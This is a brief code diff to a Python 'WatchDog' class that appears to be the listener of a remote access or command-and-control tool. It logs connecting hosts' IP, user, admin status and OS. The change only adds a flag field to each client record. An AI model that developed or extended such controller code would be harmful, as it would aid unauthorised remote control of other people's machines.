@@ -71,7 +71,7 @@ class WatchDog:
         while self.running:
             time.sleep(10)
             for pp in self.data_clients:
-                if not pp[4]:
+                if not pp[5]:
                     if not self.cmd_WhoAmI(pp[0]):
                         print('\r' + ' ' * 30 + '\r', end='', flush=True)
                         print(f"{colorama.Fore.RED}[-] {colorama.Fore.LIGHTMAGENTA_EX}client has disconnected IP:{pp[1]}, User: {pp[2]}, Admin: {pp[3]}, OS: {pp[4]}{colorama.Fore.LIGHTBLUE_EX}")
@@ -92,7 +92,7 @@ class WatchDog:
                     print(f"{colorama.Fore.GREEN}[+] {colorama.Fore.LIGHTMAGENTA_EX}Client connected IP: {addr[0]}, User: {User_name}, Admin: {Check_Privileges} OS: {name_os}{colorama.Fore.LIGHTBLUE_EX}")
                     print(self.WatchDog_Input_Text, end='', flush=True)
 
-                    self.data_clients.append([conn, addr[0], User_name, Check_Privileges, name_os])
+                    self.data_clients.append([conn, addr[0], User_name, Check_Privileges, name_os, False])
 
                 except socket.timeout:
                     pass
